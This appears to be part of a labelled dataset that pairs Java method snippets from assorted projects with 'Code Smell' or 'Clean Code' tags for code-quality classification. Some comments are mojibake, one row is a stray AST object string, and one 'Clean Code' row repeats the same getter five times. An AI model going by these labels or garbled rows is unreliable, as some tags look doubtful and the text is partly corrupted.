    for (    Object o : references) {
      if (o instanceof Value) {
        Value val=(Value)o;
        Instance inst=val.getDefiningInstance();
        if (includeWeak || !isWeakRef(inst)) {
          instances.add(inst);
        }
      }
 else       if (o instanceof Instance) {
        if (includeWeak || !isWeakRef((Instance)o)) {
          instances.add(o);
        }
      }
    }
  }
  return instances.iterator();
}
",1,Code Smell
"private JsonConverter createConverter(TypeInfo<?> typeInfo){
  Class<?> typeClass=typeInfo.getTypeClass();
  if (typeClass == TypeInfos.VOID_TYPE_INFO.getTypeClass()) {
    return (mapper,value) -> mapper.getNodeFactory().nullNode();
  }
  if (typeClass == TypeInfos.BOOLEAN_TYPE_INFO.getTypeClass()) {
    return (mapper,value) -> mapper.getNodeFactory().booleanNode((boolean)value);
  }
  if (typeClass == TypeInfos.SHORT_TYPE_INFO.getTypeClass()) {
    return (mapper,value) -> mapper.getNodeFactory().numberNode((short)value);
  }
  if (typeClass == TypeInfos.INT_TYPE_INFO.getTypeClass()) {
    return (mapper,value) -> mapper.getNodeFactory().numberNode((int)value);
  }
  if (typeClass == TypeInfos.LONG_TYPE_INFO.getTypeClass()) {
    return (mapper,value) -> mapper.getNodeFactory().numberNode((long)value);
  }
  if (typeClass == TypeInfos.BIG_INTEGER_TYPE_INFO.getTypeClass()) {
    return (mapper,value) -> mapper.getNodeFactory().numberNode((BigInteger)value);
  }
  if (typeClass == TypeInfos.FLOAT_TYPE_INFO.getTypeClass()) {
    return (mapper,value) -> mapper.getNodeFactory().numberNode((float)value);
  }
  if (typeClass == TypeInfos.DOUBLE_TYPE_INFO.getTypeClass()) {
    return (mapper,value) -> mapper.getNodeFactory().numberNode((double)value);
  }
  if (typeClass == TypeInfos.BIG_DECIMAL_TYPE_INFO.getTypeClass()) {
    return (mapper,value) -> mapper.getNodeFactory().numberNode(new BigDecimal(value.toString()));
  }
  if (typeClass == TypeInfos.STRING_TYPE_INFO.getTypeClass()) {
    return createStringConverter();
  }
  if (typeClass == TypeInfos.LOCAL_DATE_TIME_TYPE_INFO.getTypeClass()) {
    return createStringConverter();
  }
  if (typeClass == TypeInfos.LOCAL_DATE_TYPE_INFO.getTypeClass()) {
    return createStringConverter();
  }
  if (typeClass == TypeInfos.LOCAL_TIME_TYPE_INFO.getTypeClass()) {
    return createStringConverter();
  }
  if (typeClass == BasicArrayTypeInfo.BINARY_TYPE_INFO.getTypeClass()) {
    return (mapper,value) -> mapper.getNodeFactory().binaryNode((byte[])value);
  }
  return createStringConverter();
}
",1,Code Smell
"/** 
 * Call the Web API
 * @param args Request parameters of method name,{""--method"", ""admin_query_topic_info""} as an example
 */
@Override public boolean processParams(String[] args) throws Exception {
  CommandLine cli=parser.parse(options,args);
  if (cli == null) {
    throw new ParseException(""Parse args failure"");
  }
  if (cli.hasOption(CliArgDef.VERSION.longOpt)) {
    version();
  }
  if (cli.hasOption(CliArgDef.HELP.longOpt)) {
    help();
  }
  String masterAddr=defMasterPortal;
  if (cli.hasOption(CliArgDef.MASTERPORTAL.longOpt)) {
    masterAddr=cli.getOptionValue(CliArgDef.MASTERPORTAL.longOpt);
    if (TStringUtils.isBlank(masterAddr)) {
      throw new Exception(CliArgDef.MASTERPORTAL.longOpt + "" is required!"");
    }
  }
  JsonObject result=null;
  String masterUrl=""http://"" + masterAddr + ""/webapi.htm"";
  if (cli.hasOption(CliArgDef.ADMINMETHOD.longOpt)) {
    Map<String,String> inParamMap=new HashMap<>();
    inParamMap.put(CliArgDef.METHOD.longOpt,""admin_get_methods"");
    result=HttpUtils.requestWebService(masterUrl,inParamMap);
    System.out.println(formatResult(result));
    System.exit(0);
  }
  String methodStr=cli.getOptionValue(CliArgDef.METHOD.longOpt);
  if (TStringUtils.isBlank(methodStr)) {
    throw new Exception(CliArgDef.METHOD.longOpt + "" is required!"");
  }
  requestParams.put(CliArgDef.METHOD.longOpt,methodStr);
  Map<String,String> convertedRequestParams=convertRequestParams(requestParams);
  result=HttpUtils.requestWebService(masterUrl,convertedRequestParams);
  String formattedResult=formatResult(result);
  System.out.println(formattedResult);
  return true;
}",0,Clean Code
"public int minLevelRequired(){
  int lvl=0;
  if (currentReplyColor != selectedReplyColor) {
    MessagesController.PeerColors peerColors=getMessagesController().peerColors;
    MessagesController.PeerColor peerColor=peerColors == null ? null : peerColors.getColor(selectedReplyColor);
    if (peerColor != null) {
      lvl=Math.max(lvl,peerColor.getLvl(isGroup));
    }
  }
  if (currentReplyEmoji != selectedReplyEmoji) {
    lvl=Math.max(lvl,getMessagesController().channelBgIconLevelMin);
  }
  if (currentProfileColor != selectedProfileColor) {
    MessagesController.PeerColors peerColors=getMessagesController().profilePeerColors;
    MessagesController.PeerColor peerColor=peerColors == null ? null : peerColors.getColor(selectedProfileColor);
    if (peerColor != null) {
      lvl=Math.max(lvl,peerColor.getLvl(isGroup));
    }
  }
  if (currentProfileEmoji != selectedProfileEmoji) {
    lvl=Math.max(lvl,getProfileIconLevelMin());
  }
  if (!DialogObject.emojiStatusesEqual(currentStatusEmoji,selectedStatusEmoji)) {
    lvl=Math.max(lvl,getEmojiStatusLevelMin());
  }
  if (!ChatThemeController.wallpaperEquals(currentWallpaper,selectedWallpaper)) {
    lvl=Math.max(lvl,getWallpaperLevelMin());
  }
  return lvl;
}",0,Clean Code
"/** 
 * 鎵撳嵃璇锋眰鏃ュ織
 * @param methodSignature
 * @param argObs
 */
public void printRequestLog(MethodSignature methodSignature,Object[] argObs){
  RequestLogDTO logVo=new RequestLogDTO();
  logVo.setId(IdUtil.fastUUID());
  request.setAttribute(REQUEST_ID_KEY,logVo.getId());
  logVo.setUri(request.getRequestURI());
  logVo.setMethod(request.getMethod());
  List<Object> args=Lists.newArrayList();
  Arrays.stream(argObs).forEach(e -> {
    if (e instanceof MultipartFile || e instanceof HttpServletRequest || e instanceof HttpServletResponse|| e instanceof BindingResult) {
      return;
    }
    args.add(e);
  }
);
  logVo.setArgs(args.toArray());
  logVo.setProduct(""austin"");
  logVo.setPath(methodSignature.getDeclaringTypeName() + ""."" + methodSignature.getMethod().getName());
  logVo.setReferer(request.getHeader(""referer""));
  logVo.setRemoteAddr(request.getRemoteAddr());
  logVo.setUserAgent(request.getHeader(""user-agent""));
  log.info(JSON.toJSONString(logVo));
}
",0,Clean Code
"@Override public void deletePermissionBatch(Collection<Long> ids,Long userId){
  List<CrmPermissionDO> permissions=permissionMapper.selectBatchIds(ids);
  if (CollUtil.isEmpty(permissions)) {
    throw exception(CRM_PERMISSION_NOT_EXISTS);
  }
  if (convertSet(permissions,CrmPermissionDO::getBizId).size() > 1) {
    throw exception(CRM_PERMISSION_DELETE_FAIL);
  }
  CrmPermissionDO permission=permissionMapper.selectByBizAndUserId(permissions.get(0).getBizType(),permissions.get(0).getBizId(),userId);
  if (permission == null) {
    throw exception(CRM_PERMISSION_DELETE_DENIED);
  }
  if (!CrmPermissionLevelEnum.isOwner(permission.getLevel())) {
    throw exception(CRM_PERMISSION_DELETE_DENIED);
  }
  permissionMapper.deleteBatchIds(ids);
}",0,Clean Code
"public String getTypeHandler(){
  return typeHandler;
}
public String getTypeHandler(){
  return typeHandler;
}
public String getTypeHandler(){
  return typeHandler;
}
public String getTypeHandler(){
  return typeHandler;
}
public String getTypeHandler(){
  return typeHandler;
}
",0,Clean Code
"private void onScrollChanged(View v,int scrollX,int scrollY,int oldScrollX,int oldScrollY){
  if (scrollY > cover.getHeight()) {
    cover.setTranslationY(scrollY - (cover.getHeight()));
    cover.setTranslationZ(V.dp(10));
    cover.setTransform(cover.getHeight() / 2f);
  }
 else {
    cover.setTranslationY(0f);
    cover.setTranslationZ(0f);
    cover.setTransform(scrollY / 2f);
  }
  cover.invalidate();
  if (currentPhotoViewer != null) {
    currentPhotoViewer.offsetView(0,oldScrollY - scrollY);
  }
  onScrollListener.onScrollChange(v,scrollX,scrollY,oldScrollX,oldScrollY);
  boolean newTabBarIsAtTop=!scrollView.canScrollVertically(1);
  if (newTabBarIsAtTop != tabBarIsAtTop) {
    tabBarIsAtTop=newTabBarIsAtTop;
    if (tabBarIsAtTop) {
      int maxY=scrollView.getChildAt(0).getHeight() - scrollView.getHeight();
      if (scrollView.getScrollY() != maxY)       scrollView.scrollTo(0,maxY);
    }
    if (tabBarColorAnim != null)     tabBarColorAnim.cancel();
    AnimatorSet set=new AnimatorSet();
    set.playTogether(ObjectAnimator.ofInt(tabsColorBackground,""alpha"",tabBarIsAtTop ? 20 : 0),ObjectAnimator.ofFloat(tabbar,View.TRANSLATION_Z,tabBarIsAtTop ? V.dp(3) : 0),ObjectAnimator.ofFloat(getToolbar(),View.TRANSLATION_Z,tabBarIsAtTop ? 0 : V.dp(3)),ObjectAnimator.ofFloat(tabsDivider,View.ALPHA,tabBarIsAtTop ? 0 : 1));
    set.setDuration(150);
    set.setInterpolator(CubicBezierInterpolator.DEFAULT);
    set.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationEnd(      Animator animation){
        tabBarColorAnim=null;
      }
    }
);
    tabBarColorAnim=set;
    set.start();
  }
  if (isInEditMode && editSaveMenuItem != null) {
    boolean buttonInView=isActionButtonInView();
    if (buttonInView == editSaveMenuItem.isVisible()) {
      editSaveMenuItem.setVisible(!buttonInView);
    }
  }
}",0,Clean Code
"/** 
 * 鏋勫缓閿欒杩斿洖鍊�
 * @param data 杩斿洖鏁版嵁
 * @param errorMsg 杩斿洖閿欒娑堟伅
 * @return
 */
public static TeslaResult errorResult(Object data,String errorMsg){
  return new TeslaResult(TeslaResult.FAILURE,data,errorMsg);
}
public static TeslaResult errorResult(Exception e){
  String message=e.getMessage();
  if (null != e.getCause()) {
    message=e.getCause().getMessage();
  }
  return new TeslaResult(TeslaResult.FAILURE,null,message);
}
",0,Clean Code
"public void recycle(){
  broadcast.unregister();
  if (mListeningKey) {
    AccessibilityService service=mAccessibilityBridge.getService();
    if (service != null) {
      service.getOnKeyObserver().removeListener(this);
      mListeningKey=false;
    }
  }
  if (mTouchObserver != null) {
    mTouchObserver.stop();
  }
  if (mListeningNotification) {
    mAccessibilityBridge.getNotificationObserver().removeNotificationListener(this);
    mAccessibilityBridge.getNotificationObserver().removeToastListener(this);
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2 && NotificationListenerService.Companion.getInstance() != null) {
      NotificationListenerService.Companion.getInstance().removeListener(this);
    }
  }
  if (mKeyInterceptor != null) {
    AccessibilityService service=mAccessibilityBridge.getService();
    if (service != null) {
      service.getKeyInterrupterObserver().removeKeyInterrupter(mKeyInterceptor);
    }
    mKeyInterceptor=null;
  }
  if (mListeningGesture) {
    AccessibilityService service=mAccessibilityBridge.getService();
    if (service != null) {
      service.getGestureEventDispatcher().removeListener(this);
    }
  }
}",0,Clean Code
"@Override public boolean checkUserClientInChatroom(String user,String clientId,String chatroomId){
  MemorySessionStore.Session session=m_Server.getStore().sessionsStore().getSession(clientId);
  String existChatroomId=(String)m_Server.getHazelcastInstance().getMap(USER_CHATROOM).get(user);
  if (chatroomId == null) {
    if (existChatroomId == null) {
      return false;
    }
 else {
      chatroomId=existChatroomId;
    }
  }
  if (StringUtil.isNullOrEmpty(existChatroomId) || !existChatroomId.equals(chatroomId)) {
    if (mChatroomRejoinWhenActive) {
      if (!StringUtil.isNullOrEmpty(existChatroomId)) {
        handleQuitChatroom(user,clientId,existChatroomId);
      }
      handleJoinChatroom(user,clientId,chatroomId);
    }
 else {
      return false;
    }
  }
  if (!mChatroomRejoinWhenActive && !checkChatroomParticipantIdelTime(session)) {
    handleQuitChatroom(user,clientId,chatroomId);
    return false;
  }
  MultiMap<String,UserClientEntry> chatroomMembers=m_Server.getHazelcastInstance().getMultiMap(CHATROOM_MEMBER_IDS);
  if (chatroomMembers == null) {
    return false;
  }
  Collection<UserClientEntry> entries=chatroomMembers.get(existChatroomId);
  if (entries == null) {
    return false;
  }
  for (  UserClientEntry entry : entries) {
    if (entry.clientId.equals(clientId)) {
      return true;
    }
  }
  return false;
}
",1,Code Smell
"@NonNull public Path findOrCreateFile(@NonNull String displayName,@Nullable String mimeType) throws IOException {
  displayName=Paths.sanitize(displayName,true);
  if (displayName == null) {
    throw new IOException(""Empty display name."");
  }
  if (displayName.indexOf(File.separatorChar) != -1) {
    throw new IllegalArgumentException(""Display name contains file separator."");
  }
  DocumentFile documentFile=getRealDocumentFile(this.documentFile);
  if (!documentFile.isDirectory()) {
    throw new IOException(""Current file is not a directory."");
  }
  String extension=null;
  if (mimeType != null) {
    extension=MimeTypeMap.getSingleton().getExtensionFromMimeType(mimeType);
  }
 else   mimeType=DEFAULT_MIME;
  String nameWithExtension=displayName + (extension != null ? ""."" + extension : """");
  checkVfs(Paths.appendPathSegment(documentFile.getUri(),nameWithExtension));
  DocumentFile file=documentFile.findFile(displayName);
  if (file != null) {
    if (file.isDirectory()) {
      throw new IOException(""Directory cannot be converted to file"");
    }
    return new PathImpl(context,file);
  }
  file=documentFile.createFile(mimeType,displayName);
  if (file == null) {
    throw new IOException(""Could not create "" + documentFile.getUri() + File.separatorChar+ nameWithExtension+ "" with type ""+ mimeType);
  }
  return new PathImpl(context,file);
}",1,Code Smell
"public static void hide(@NonNull FrameLayout containerLayout){
  hide(containerLayout,true);
}
public static void hide(@NonNull FrameLayout containerLayout,boolean animated){
  final Bulletin bulletin=find(containerLayout);
  if (bulletin != null) {
    bulletin.hide(animated && isTransitionsEnabled(),0);
  }
}
public void hide(){
  hide(isTransitionsEnabled(),0);
}
public void hide(long duration){
  hide(isTransitionsEnabled(),duration);
}
public void hide(boolean animated,long duration){
  if (layout == null) {
    return;
  }
  if (showing) {
    showing=false;
    if (visibleBulletin == this) {
      visibleBulletin=null;
    }
    int bottomOffset=currentBottomOffset;
    currentBottomOffset=0;
    if (ViewCompat.isLaidOut(layout)) {
      layout.removeCallbacks(hideRunnable);
      if (animated) {
        layout.transitionRunningExit=true;
        layout.delegate=currentDelegate;
        layout.invalidate();
        if (duration >= 0) {
          Layout.DefaultTransition transition=new Layout.DefaultTransition();
          transition.duration=duration;
          layoutTransition=transition;
        }
 else {
          ensureLayoutTransitionCreated();
        }
        layoutTransition.animateExit(layout,layout::onExitTransitionStart,() -> {
          if (currentDelegate != null && !layout.top) {
            currentDelegate.onBottomOffsetChange(0);
            currentDelegate.onHide(this);
          }
          layout.transitionRunningExit=false;
          layout.onExitTransitionEnd();
          layout.onHide();
          containerLayout.removeView(parentLayout);
          containerLayout.removeOnLayoutChangeListener(containerLayoutListener);
          layout.onDetach();
          if (onHideListener != null) {
            onHideListener.run();
          }
        }
,offset -> {
          if (currentDelegate != null && !layout.top) {
            currentDelegate.onBottomOffsetChange(layout.getHeight() - offset);
          }
        }
,bottomOffset);
        return;
      }
    }
    if (currentDelegate != null && !layout.top) {
      currentDelegate.onBottomOffsetChange(0);
      currentDelegate.onHide(this);
    }
    layout.onExitTransitionStart();
    layout.onExitTransitionEnd();
    layout.onHide();
    if (containerLayout != null) {
      AndroidUtilities.runOnUIThread(() -> {
        containerLayout.removeView(parentLayout);
        containerLayout.removeOnLayoutChangeListener(containerLayoutListener);
      }
);
    }
    layout.onDetach();
    if (onHideListener != null) {
      onHideListener.run();
    }
  }
}",1,Code Smell
"@Override public SearchResult searchMod(SearchFilters searchFilters,SearchResult previousPageResult){
  ModrinthSearchResult modrinthSearchResult=(ModrinthSearchResult)previousPageResult;
  if (modrinthSearchResult != null && modrinthSearchResult.previousOffset >= modrinthSearchResult.totalResultCount) {
    ModrinthSearchResult emptyResult=new ModrinthSearchResult();
    emptyResult.results=new ModItem[0];
    emptyResult.totalResultCount=modrinthSearchResult.totalResultCount;
    emptyResult.previousOffset=modrinthSearchResult.previousOffset;
    return emptyResult;
  }
  HashMap<String,Object> params=new HashMap<>();
  StringBuilder facetString=new StringBuilder();
  facetString.append(""["");
  facetString.append(String.format(""[\""project_type:%s\""]"",searchFilters.isModpack ? ""modpack"" : ""mod""));
  if (searchFilters.mcVersion != null && !searchFilters.mcVersion.isEmpty())   facetString.append(String.format("",[\""versions:%s\""]"",searchFilters.mcVersion));
  facetString.append(""]"");
  params.put(""facets"",facetString.toString());
  params.put(""query"",searchFilters.name);
  params.put(""limit"",50);
  params.put(""index"",""relevance"");
  if (modrinthSearchResult != null)   params.put(""offset"",modrinthSearchResult.previousOffset);
  JsonObject response=mApiHandler.get(""search"",params,JsonObject.class);
  if (response == null)   return null;
  JsonArray responseHits=response.getAsJsonArray(""hits"");
  if (responseHits == null)   return null;
  ModItem[] items=new ModItem[responseHits.size()];
  for (int i=0; i < responseHits.size(); ++i) {
    JsonObject hit=responseHits.get(i).getAsJsonObject();
    items[i]=new ModItem(Constants.SOURCE_MODRINTH,hit.get(""project_type"").getAsString().equals(""modpack""),hit.get(""project_id"").getAsString(),hit.get(""title"").getAsString(),hit.get(""description"").getAsString(),hit.get(""icon_url"").getAsString());
  }
  if (modrinthSearchResult == null)   modrinthSearchResult=new ModrinthSearchResult();
  modrinthSearchResult.previousOffset+=responseHits.size();
  modrinthSearchResult.results=items;
  modrinthSearchResult.totalResultCount=response.get(""total_hits"").getAsInt();
  return modrinthSearchResult;
}",1,Code Smell
"public static void main(String[] args) throws Exception {
  Arguments arguments=Arguments.fromArgs(args);
  int repetitions=arguments.getInteger(""bench_repetitions"",""number of repetitions"",10);
  int nrTileReads=arguments.getInteger(""bench_nr_tile_reads"",""number of tiles to read"",500_000);
  int preWarms=arguments.getInteger(""bench_pre_warms"",""number of pre warm runs"",3);
  List<Path> mbtilesPaths=arguments.getList(""bench_mbtiles"",""the mbtiles file to read from"",List.of()).stream().map(Paths::get).toList();
  if (mbtilesPaths.isEmpty()) {
    throw new IllegalArgumentException(""pass one or many paths to the same mbtiles file"");
  }
  mbtilesPaths.stream().forEach(p -> {
    if (!Files.exists(p) || !Files.isRegularFile(p)) {
      throw new IllegalArgumentException(""%s does not exists"".formatted(p));
    }
  }
);
  List<TileCoord> randomCoordsToFetchPerRepetition=new LinkedList<>();
  do {
    try (var db=Mbtiles.newReadOnlyDatabase(mbtilesPaths.getFirst())){
      try (var statement=db.connection().prepareStatement(SELECT_RANDOM_COORDS)){
        statement.setInt(1,nrTileReads - randomCoordsToFetchPerRepetition.size());
        var rs=statement.executeQuery();
        while (rs.next()) {
          int x=rs.getInt(""tile_column"");
          int y=rs.getInt(""tile_row"");
          int z=rs.getInt(""zoom_level"");
          randomCoordsToFetchPerRepetition.add(TileCoord.ofXYZ(x,(1 << z) - 1 - y,z));
        }
      }
     }
   }
 while (randomCoordsToFetchPerRepetition.size() < nrTileReads);
  Map<Path,Double> avgReadOperationsPerSecondPerDb=new HashMap<>();
  for (  Path dbPath : mbtilesPaths) {
    List<ReadResult> results=new LinkedList<>();
    LOGGER.info(""working on {}"",dbPath);
    for (int preWarm=0; preWarm < preWarms; preWarm++) {
      readEachTile(randomCoordsToFetchPerRepetition,dbPath);
    }
    for (int rep=0; rep < repetitions; rep++) {
      results.add(readEachTile(randomCoordsToFetchPerRepetition,dbPath));
    }
    var readOperationsPerSecondStats=results.stream().mapToDouble(ReadResult::readOperationsPerSecond).summaryStatistics();
    LOGGER.info(""readOperationsPerSecondStats: {}"",readOperationsPerSecondStats);
    avgReadOperationsPerSecondPerDb.put(dbPath,readOperationsPerSecondStats.getAverage());
  }
  List<Path> keysSorted=avgReadOperationsPerSecondPerDb.entrySet().stream().sorted((o1,o2) -> o1.getValue().compareTo(o2.getValue())).map(Map.Entry::getKey).toList();
  LOGGER.info(""diffs"");
  for (int i=0; i < keysSorted.size() - 1; i++) {
    for (int j=i + 1; j < keysSorted.size(); j++) {
      Path db0=keysSorted.get(i);
      double avg0=avgReadOperationsPerSecondPerDb.get(db0);
      Path db1=keysSorted.get(j);
      double avg1=avgReadOperationsPerSecondPerDb.get(db1);
      double diff=avg1 * 100 / avg0 - 100;
      LOGGER.info(""\""{}\"" to \""{}\"": avg read operations per second improved by {}%"",db0,db1,diff);
    }
  }
}",1,Code Smell
"public boolean sign(File in,File out,int minSdk,boolean alignFileSize){
  ApkSigner.SignerConfig signerConfig=new ApkSigner.SignerConfig.Builder(""CERT"",mPrivateKey,Collections.singletonList(mCertificate)).build();
  ApkSigner.Builder builder=new ApkSigner.Builder(Collections.singletonList(signerConfig));
  builder.setInputApk(in);
  builder.setOutputApk(out);
  builder.setCreatedBy(""AppManager"");
  builder.setAlignFileSize(alignFileSize);
  if (minSdk != -1)   builder.setMinSdkVersion(minSdk);
  if (mSigSchemes.v1SchemeEnabled()) {
    builder.setV1SigningEnabled(true);
  }
  if (mSigSchemes.v2SchemeEnabled()) {
    builder.setV2SigningEnabled(true);
  }
  if (mSigSchemes.v3SchemeEnabled()) {
    builder.setV3SigningEnabled(true);
  }
  if (mSigSchemes.v4SchemeEnabled()) {
    if (mIdsigFile == null) {
      throw new RuntimeException(""idsig file is mandatory for v4 signature scheme."");
    }
    builder.setV4SigningEnabled(true);
    builder.setV4SignatureOutputFile(mIdsigFile);
  }
  ApkSigner signer=builder.build();
  Log.i(TAG,""SignApk: %s"",in);
  try {
    if (alignFileSize && !ZipAlign.verify(in,ZipAlign.ALIGNMENT_4,true)) {
      ZipAlign.align(in,ZipAlign.ALIGNMENT_4,true);
    }
    signer.sign();
    Log.i(TAG,""The signature is complete and the output file is %s"",out);
    return true;
  }
 catch (  Exception e) {
    Log.w(TAG,e);
    return false;
  }
}",0,Clean Code
"@Override public void onClick(View widget){
  Object tag=widget.getTag(R.id.linkify_click_handler);
  if (tag != null) {
    ((LinkifyClickHandler)tag).onUrlClick(url);
  }
 else {
    super.onClick(widget);
  }
}
@Override public void onClick(View widget){
  Object tag=widget.getTag(R.id.linkify_click_handler);
  if (tag != null) {
    ((LinkifyClickHandler)tag).onTimeClick(url);
  }
}
",0,Clean Code
"/** 
 * Relies upon allLeftIndices being sorted in ascending order. Undefined when it's not.
 * @param allLeftIndices The indices of the left branch.
 * @param buffer The buffer to write out the unused indices to.
 * @return A pair, with the first element the left branch and the second element the right branch.
 */
public Pair<InvertedFeature,InvertedFeature> split(IntArrayContainer allLeftIndices,IntArrayContainer buffer){
  int[] allLeftArray=allLeftIndices.array;
  int allLeftSize=allLeftIndices.size;
  int[] bufferArray=buffer.array;
  if (indices != null) {
    int[] leftIndices=new int[indices.length];
    int leftSize=0;
    int[] rightIndices=new int[indices.length];
    int rightSize=0;
    int bufferIdx=0;
    int curIndex=0;
    int j=0;
    for (int i=0; i < curSize; i++) {
      while ((j < allLeftSize) && ((curIndex=allLeftArray[j]) < indices[i])) {
        bufferArray[bufferIdx]=curIndex;
        bufferIdx++;
        j++;
      }
      if ((j < allLeftSize) && (allLeftArray[j] == indices[i])) {
        leftIndices[leftSize]=indices[i];
        leftSize++;
        j++;
      }
 else {
        rightIndices[rightSize]=indices[i];
        rightSize++;
      }
    }
    if (j < allLeftSize) {
      System.arraycopy(allLeftArray,j,bufferArray,bufferIdx,allLeftSize - j);
    }
    buffer.size=bufferIdx + (allLeftSize - j);
    allLeftIndices.size=0;
    InvertedFeature left, right;
    if (leftSize == 0) {
      left=null;
    }
 else     if (leftSize == 1) {
      left=new InvertedFeature(value,leftIndices[0]);
    }
 else {
      left=new InvertedFeature(value,Arrays.copyOf(leftIndices,leftSize));
    }
    if (rightSize == 0) {
      right=null;
    }
 else     if (rightSize == 1) {
      right=new InvertedFeature(value,rightIndices[0]);
    }
 else {
      right=new InvertedFeature(value,Arrays.copyOf(rightIndices,rightSize));
    }
    return new Pair<>(left,right);
  }
 else {
    boolean found=false;
    int i=0;
    while (!found && i < allLeftSize) {
      if (allLeftArray[i] == index) {
        found=true;
      }
 else {
        i++;
      }
    }
    if (found) {
      System.arraycopy(allLeftArray,0,bufferArray,0,i);
      i++;
      while (i < allLeftSize) {
        bufferArray[i - 1]=allLeftArray[i];
        i++;
      }
      if (i < allLeftSize - 1) {
        System.arraycopy(allLeftArray,i + 1,bufferArray,i,allLeftSize - i);
      }
      buffer.size=allLeftSize - 1;
      allLeftIndices.size=0;
      return new Pair<>(new InvertedFeature(value,index),null);
    }
 else {
      allLeftIndices.array=bufferArray;
      allLeftIndices.size=0;
      buffer.array=allLeftArray;
      buffer.size=allLeftSize;
      return new Pair<>(null,new InvertedFeature(value,index));
    }
  }
}",0,Clean Code
"/** 
 * 绉婚櫎绌虹櫧
 * @param data 鏁版嵁
 * @return int
 */
private static int removeWhiteSpace(char[] data){
  if (data == null) {
    return 0;
  }
  int newSize=0;
  int len=data.length;
  for (int i=0; i < len; i++) {
    if (!isWhiteSpace(data[i])) {
      data[newSize++]=data[i];
    }
  }
  return newSize;
}",0,Clean Code
"/** 
 * Construct paging return object
 * @param data object returned
 * @param total total number of items
 * @param pageNo page number
 * @param pageSize paging size
 * @param < T > The returned object type
 * @return paging return object
 */
public static <T>PageResult<T> of(List<T> data,Long total,Long pageNo,Long pageSize){
  return new PageResult<>(data,total,pageNo,pageSize);
}
/** 
 * Construct paging return object
 * @param data object returned
 * @param total total number of items
 * @param pageNo page number
 * @param pageSize paging size
 * @param < T > The returned object type
 * @return paging return object
 */
public static <T>PageResult<T> of(List<T> data,Long total,Integer pageNo,Integer pageSize){
  return new PageResult<>(data,total,pageNo,pageSize);
}
/** 
 * Construct paging return object
 * @param data object returned
 * @param total total number of items
 * @param param paging parameters
 * @param < T > The returned object type
 * @return paging return object
 */
public static <T>PageResult<T> of(List<T> data,Long total,PageQueryParam param){
  return new PageResult<>(data,total,param.getPageNo(),param.getPageSize());
}
/** 
 * Construct paging return object Total number of items returned
 * @param data object returned
 * @param param paging parameters
 * @param < T > The returned object type
 * @return paging return object
 */
public static <T>PageResult<T> of(List<T> data,PageQueryParam param){
  return new PageResult<>(data,0L,param.getPageNo(),param.getPageSize());
}",0,Clean Code
"public static String formatDistance(float distance,int type){
  return formatDistance(distance,type,null);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@7b4183e3",0,Clean Code
"public void writeLibrary(Collection<FuncInfo> functions,Map<String,List<String>> enumMap) throws IOException {
  try (BufferedWriter writer=Files.newBufferedWriter(dir.resolve(className + "".java""))){
    writer.append(""package "").append(packageName).append("";\n\n"");
    writer.append(""import com.sun.jna.Callback;\n"");
    writer.append(""import com.sun.jna.Library;\n"");
    writer.append(""import com.sun.jna.Pointer;\n"");
    writer.append(""import com.sun.jna.ptr.PointerByReference;\n"");
    writer.append(""import java.nio.ByteBuffer;\n"");
    writer.append(""import java.nio.FloatBuffer;\n"");
    writer.append(""import java.nio.IntBuffer;\n"");
    writer.append(""import java.nio.LongBuffer;\n"");
    writer.append(""\npublic interface "").append(className).append("" extends Library {\n\n"");
    for (    Map.Entry<String,List<String>> entry : enumMap.entrySet()) {
      String name=entry.getKey();
      writer.append(""\n    enum "").append(name).append("" {\n"");
      List<String> fields=entry.getValue();
      int count=0;
      for (      String field : fields) {
        writer.append(""        "").append(field);
        if (++count < fields.size()) {
          writer.append(',');
        }
        writer.append('\n');
      }
      writer.append(""    }\n"");
    }
    for (    TypeDefine typeDefine : typedefMap.values()) {
      if (typeDefine.isCallBack()) {
        String callbackName=typeDefine.getDataType().getType();
        String returnType=mapping.getProperty(callbackName);
        if (returnType == null) {
          returnType=typeDefine.getValue();
        }
        writer.append(""\n    interface "").append(callbackName);
        writer.append("" extends Callback {\n"");
        writer.append(""        "").append(returnType).append("" apply("");
        writeParameters(writer,callbackName,typeDefine.getParameters());
        writer.append("");\n"");
        writer.append(""    }\n"");
      }
    }
    for (    FuncInfo info : functions) {
      writeFunction(writer,info);
    }
    writer.append(""}\n"");
  }
 }",1,Code Smell
"public int getItemCountInternal(){
  if (foundContextBot != null && !inlineMediaEnabled) {
    return 1;
  }
  if (stickers != null) {
    return stickers.size();
  }
 else   if (searchResultBotContext != null) {
    return searchResultBotContext.size() + (searchResultBotContextSwitch != null || searchResultBotWebViewSwitch != null ? 1 : 0);
  }
 else   if (searchResultUsernames != null) {
    return searchResultUsernames.size();
  }
 else   if (searchResultHashtags != null) {
    return searchResultHashtags.size();
  }
 else   if (searchResultCommands != null || quickReplies != null) {
    return (quickReplies == null ? 0 : quickReplies.size()) + (searchResultCommands == null ? 0 : searchResultCommands.size());
  }
 else   if (searchResultSuggestions != null) {
    return searchResultSuggestions.size();
  }
  return 0;
}",0,Clean Code
"/** 
 * Appends multiple  {@link MediaSource}s to the playlist.
 * @param mediaSources A collection of {@link MediaSource}s to be added to the list. The media sources are added in the order in which they appear in this collection.
 */
public final synchronized void addMediaSources(Collection<MediaSource> mediaSources){
  addPublicMediaSources(mediaSourcesPublic.size(),mediaSources,null,null);
}
/** 
 * Appends multiple  {@link MediaSource}s to the playlist and executes a custom action on completion.
 * @param mediaSources A collection of {@link MediaSource}s to be added to the list. The media sources are added in the order in which they appear in this collection.
 * @param handler The {@link Handler} to run {@code onCompletionAction}.
 * @param onCompletionAction A {@link Runnable} which is executed immediately after the mediasources have been added to the playlist.
 */
public final synchronized void addMediaSources(Collection<MediaSource> mediaSources,Handler handler,Runnable onCompletionAction){
  addPublicMediaSources(mediaSourcesPublic.size(),mediaSources,handler,onCompletionAction);
}
/** 
 * Adds multiple  {@link MediaSource}s to the playlist.
 * @param index The index at which the new {@link MediaSource}s will be inserted. This index must be in the range of 0 &lt;= index &lt;=  {@link #getSize()}.
 * @param mediaSources A collection of {@link MediaSource}s to be added to the list. The media sources are added in the order in which they appear in this collection.
 */
public final synchronized void addMediaSources(int index,Collection<MediaSource> mediaSources){
  addPublicMediaSources(index,mediaSources,null,null);
}
/** 
 * Adds multiple  {@link MediaSource}s to the playlist and executes a custom action on completion.
 * @param index The index at which the new {@link MediaSource}s will be inserted. This index must be in the range of 0 &lt;= index &lt;=  {@link #getSize()}.
 * @param mediaSources A collection of {@link MediaSource}s to be added to the list. The media sources are added in the order in which they appear in this collection.
